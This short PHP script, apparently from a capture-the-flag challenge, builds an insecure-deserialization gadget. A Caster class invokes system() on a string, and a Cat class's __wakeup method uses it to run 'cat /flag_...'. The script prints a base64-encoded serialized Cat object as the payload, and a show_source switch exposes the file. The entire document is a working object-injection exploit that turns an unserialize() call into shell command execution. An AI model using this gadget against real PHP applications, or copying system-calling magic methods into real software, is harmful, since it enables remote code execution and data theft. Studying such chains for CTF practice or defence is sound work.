<?php
isset($_GET['source']) && die(!show_source(__FILE__));

class Caster
{
    public $cast_func = 'system';
    public function cast($val)
    {
        return ($this->cast_func)($val);
    }
}

class Cat
{
    public $magic;
    public $spell;
    public function __construct()
    {
        $this->magic = new Caster();
        $this->spell = "cat /flag_23907376917516c8 ";
    }
    public function __wakeup()
    {
        echo "Cat Wakeup!\n";
        $this->magic->cast($this->spell);
    }
}

echo base64_encode(serialize(new Cat()));
